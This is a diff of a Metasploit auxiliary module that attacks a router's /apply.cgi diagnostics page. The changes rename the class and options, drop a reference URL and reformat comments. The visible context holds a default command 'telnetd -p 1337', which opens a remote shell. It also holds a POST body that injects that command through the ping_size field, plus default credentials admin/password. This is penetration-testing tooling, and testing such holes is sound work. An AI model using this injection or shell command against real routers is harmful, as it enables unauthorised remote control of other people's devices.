@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -26,23 +23,22 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '89912' ],
           [ 'BID', '57760' ],
           [ 'EDB', '24475' ],
-          [ 'URL', 'http://homesupport.cisco.com/de-eu/support/routers/E1500' ],
           [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]
         ],
       'DisclosureDate' => 'Feb 05 2013'))
 
     register_options(
       [
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
+        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword',[ true, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
-      ], self.class)
+      ])
   end
 
   def run
     uri = '/apply.cgi'
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    user = datastore['HttpUsername']
+    pass = datastore['HttpPassword']
 
     print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
 
@@ -71,9 +67,9 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
 
     cmd = datastore['CMD']
-    #original post request:
-    #data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&
-    #action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="
+    # original post request:
+    # data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&
+    # action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="
 
     vprint_status("#{rhost}:#{rport} - using the following target URL: #{uri}")
     begin
